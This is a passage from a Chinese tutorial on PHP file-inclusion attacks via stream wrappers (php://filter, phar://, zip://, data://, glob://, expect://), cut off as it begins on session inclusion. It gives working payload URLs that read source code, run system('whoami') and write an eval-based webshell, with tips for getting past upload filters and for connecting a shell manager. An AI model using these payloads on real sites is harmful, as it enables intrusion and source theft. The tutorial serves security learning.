核心的组成部分。无需安装即可使用这些函数。</p></li></ul><p><strong>利用条件：</strong></p><ol><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>相关参数：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>read</td><td>读取</td></tr><tr><td>write</td><td>写入</td></tr><tr><td>resource</td><td>数据来源</td></tr></tbody></table><p><strong>相关参数值：</strong></p><p><code>read：</code></p><ul><li><p>string.strip_tags：清楚数据流中的html标签      </p></li><li><p>string.toupper：奖数据流中的内容转换为大写</p></li><li><p>string.tolower： 将数据流中的内容转换为小写</p></li><li><p>convert.base64-encode：将数据流的内容转换为base64编码</p></li><li><p>convert.urlencode：将数据流转换为url编码</p></li></ul><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">另外一种：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//效果跟前面的一样，少了read等关键字。在绕过一些waf时也许有用。</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p></blockquote><h5 class="anchor anchorWithStickyNavbar_mojV" id="phar"><code>phar://</code><a class="hash-link" href="#phar" title="Direct link to heading">​</a></h5><ul><li>这个就是php解压缩包的一个伪协议，不管后缀是什么，都会当做压缩包来解压。</li></ul><p><strong>利用条件：</strong></p><ol><li>php版本大于等于php5.3.0</li><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法</strong>：</p><p>写一个文件phpinfo.php，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩文件格式的压缩包，如下：</p><p>指定绝对路径:</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/phpinfo.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>或者使用相对路径（这里<code>test.zip</code>就在当前目录下，和<code>fileinclude.php</code>同一目录）:</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=phar://test.zip/phpinfo.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p><strong>注意</strong>：其中<code>test.zip</code>必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过<code>test.zip</code>的后缀可以不是zip，可以是像<code>test.jpg</code>，甚至<code>test.111</code>这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为<code>test.111</code>这样的后缀肯定不会被拦截了，这时就能成功：</p></blockquote><h6 class="anchor anchorWithStickyNavbar_mojV" id="phar命令执行"><code>phar://（命令执行）</code><a class="hash-link" href="#phar命令执行" title="Direct link to heading">​</a></h6><p><strong>利用条件：</strong></p><ol><li>php版本大于等于php5.3.0</li><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法：</strong></p><p>同<code>phar://</code>，只不过把文件内容改成<code>&lt;?php system(&#x27;whoami&#x27;);?&gt;</code></p><h6 class="anchor anchorWithStickyNavbar_mojV" id="phar写入木马"><code>phar://（写入木马）</code><a class="hash-link" href="#phar写入木马" title="Direct link to heading">​</a></h6><p><strong>利用条件：</strong></p><ol><li>php版本大于等于php5.3.0</li><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法</strong></p><p>写一个木马shell.php，其内容为<code>&lt;?php @eval($_POST[v]);?&gt;</code>，打包成zip压缩文件格式的压缩包</p><p>指定绝对路径</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">http://192.168.1.4/fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/shell.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>或者使用相对路径（这里<code>test.zip</code>就在当前目录下）</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">http://192.168.1.4/fileinclude.php?file=phar://test.zip/shell.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>先访问url地址，然后马就写进去了。</p><p>然后用shell管理工具，将上面两个的url地址随便选一个，填写到shell管理工具的url地址里，比如蚁剑等便能成功连接。</p><h5 class="anchor anchorWithStickyNavbar_mojV" id="zip"><code>zip://</code><a class="hash-link" href="#zip" title="Direct link to heading">​</a></h5><ul><li>zip伪协议和phar伪协议类似，但是用法不一样。</li></ul><p><strong>利用条件：</strong></p><ol><li>php版本大于等于php5.3.0</li><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法：</strong>
构造zip包的方法同phar：</p><p>写一个文件phpinfo.php，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩文件格式的压缩包</p><p>但是使用zip伪协议，<strong>需要指定绝对路径</strong>，而且压缩包文件和压缩包内的文件之间得用<code>#</code>，还要将<code>#</code>给URL编码为<code>%23</code>，之后填上压缩包内的文件。</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23phpinfo.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>若是使用相对路径，则会文件包含失败。</p><blockquote><p><strong>注意</strong>：这里需要注意的和<code>phar://</code>中的注意一样，其中<code>test.zip</code>必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过<code>test.zip</code>的后缀可以不是zip，可以是像<code>test.jpg</code>，甚至<code>test.111</code>这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为<code>test.111</code>这样的后缀肯定不会被拦截了，这时就能成功：</p></blockquote><h5 class="anchor anchorWithStickyNavbar_mojV" id="data"><code>data://</code><a class="hash-link" href="#data" title="Direct link to heading">​</a></h5><p>数据流封装器，和<code>php://</code>相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p><p><strong>利用条件：</strong></p><ol><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">PD9waHAgcGhwaW5mbygpOz8+`的base64解码为：`&lt;?php phpinfo();?&gt;`。其中加号`+`的url编码为`%2b`。如果不手动url编码会报错：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`Parse error: syntax error, unexpected &#x27;?&#x27; in data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8 on line 1</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></blockquote><p><strong>写入木马</strong>：</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=data:text/plain,&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;);?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="zlib"><code>zlib://</code><a class="hash-link" href="#zlib" title="Direct link to heading">​</a></h5><p>zlib://封装协议，包含3个协议，正好对应的是 &#x27;压缩与归档扩展&#x27; 里的3个扩展：</p><ul><li>zlib://<code>(目前使用：compress.zlib://)</code> - 对应 &#x27;zlib&#x27; 扩展</li><li>bzip2://<code>(目前使用：compress.bzip2://)</code> - 对应 &#x27;bzip2&#x27; 扩展</li><li>zip:// - 对应 &#x27;zip&#x27; 扩展</li></ul><p><strong>使用简介：</strong></p><ul><li>3个封装协议，都是直接打开压缩文件。</li><li>compress.zlib://file.gz - 处理的是 &#x27;.gz&#x27; 后缀的压缩包</li><li>compress.bzip2://file.bz2 - 处理的是 &#x27;.bz2&#x27; 后缀的压缩包</li><li>zip://archive.zip/file.txt - 处理的是 &#x27;.zip&#x27; 后缀的压缩包里的文件</li><li>可以参照 &quot;压缩与归档扩展&quot; 对应的3个扩展的使用方法</li></ul><h5 class="anchor anchorWithStickyNavbar_mojV" id="glob"><code>glob://</code><a class="hash-link" href="#glob" title="Direct link to heading">​</a></h5><p>查找匹配的文件路径模式</p><p><strong>使用条件：</strong></p><ol><li>allow_url_fopen = 无要求</li><li>allow_url_include = 无要求</li></ol><p><strong>语法：</strong></p><p><code>查找code文件夹内所有文件</code></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=glob://E:/phpstudy/WWW/code/*.*</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>查找所有带php后缀的文件</code></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=glob://ext/spl/examples/*.php</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="ssh2"><code>ssh2://</code><a class="hash-link" href="#ssh2" title="Direct link to heading">​</a></h5><blockquote><p><strong>Note</strong>:<strong>该封装器默认没有激活</strong>
为了使用ssh2.*://封装协议，你必须安装来自» PECL的» SSH2扩展。</p><p>除了支持传统的 URI 登录信息，ssh2 封装协议也支持通过 URL 的主机（host）部分来复用打开连接。</p></blockquote><p><strong>使用条件：</strong></p><ol><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">ssh2.shell://user:pass@example.com:22/xterm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2.sftp://user:pass@example.com:22/path/to/filename</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="ogg"><code>ogg://</code><a class="hash-link" href="#ogg" title="Direct link to heading">​</a></h5><p>通过包装器 ogg:// 读取的文件， 是作为 <code>OGG/Vorbis</code> 格式的压缩音频编码。 同样，通过包装器 ogg:// 写入或追加的数据格式也是压缩音频</p><blockquote><p><strong>封装器默认未激活</strong>
要使用 ogg:// 封装器，您必须安装 <a href="https://pecl.php.net/package/oggvorbis" target="_blank" rel="noopener noreferrer">» OGG/Vorbis</a> 扩展。 可以在 <a href="https://pecl.php.net/" target="_blank" rel="noopener noreferrer">» PECL</a> 上找到。</p></blockquote><p><strong>使用条件：</strong></p><ol><li>allow_url_fopen = Off</li><li>allow_url_include = On</li></ol><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">ogg://soundfile.ogg  相对地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ogg:///path/to/soundfile.ogg  绝对地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ogg://http://www.example.com/path/to/soundstream.ogg  从外部网页获取</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="expect"><code>expect://</code><a class="hash-link" href="#expect" title="Direct link to heading">​</a></h5><blockquote><p>该封装协议默认未开启</p><p>为了使用 expect:// 封装器，你必须安装 » PECL 上的 » Expect 扩展。</p></blockquote><p><strong>用法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">expect://command 直接输入命令</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">该协议是基于shell和ssh的直接操作服务器的协议，能够直接在远端操作命令执行</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="包含session">包含session<a class="hash-link" href="#包含session" title="Direct link to heading">​</a></h3><h4 class="anchor anchorWithStickyNavbar_mojV" id="相关函数-1">相关函数<a class="hash-link" href="#相关函数-1" title="Direct link to heading">​</a></h4><h5 class="anchor anchorWithStickyNavbar_mojV" id="session_name"><code>session_name()</code><a class="hash-link" href="#session_name" title="Direct link to heading">​</a></h5><ul><li><strong>session_name()</strong> 函数返回当前会话名称。 如果指定 <code>name</code> 参数， <strong>session_name()</strong> 函数会更新会话名称， 并返回 <strong>原来的</strong>会话名称。</li><li>如果使用 <code>name</code> 指定了新字符串作为会话 cookie 的名字， <strong>session_name()</strong> 函数会修改 HTTP 响应中的 cookie （如果启用了 <code>session.transid</code>，还会输出会话 cookie 的内容）。 </li><li>一旦在 HTTP 响应中发送了 cookie 的内容之后， 调用 <strong>session_name()</strong> 函数会产生错误。 所以，一定要在调用 <a href="https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener noreferrer">session_start()</a> 函数之前 调用此函数。</li><li>请求开始的时候，会话名称会被重置并且存储到 <code>session.name</code> 配置项。 因此，要想设置会话名称，那么对于每个请求，都需要在 调用 <a href="https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener noreferrer">session_start()</a> 函数 之前调用 <strong>session_name()</strong> 函数。</li></ul><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">session_name(string $name = ?): string</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>参数：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 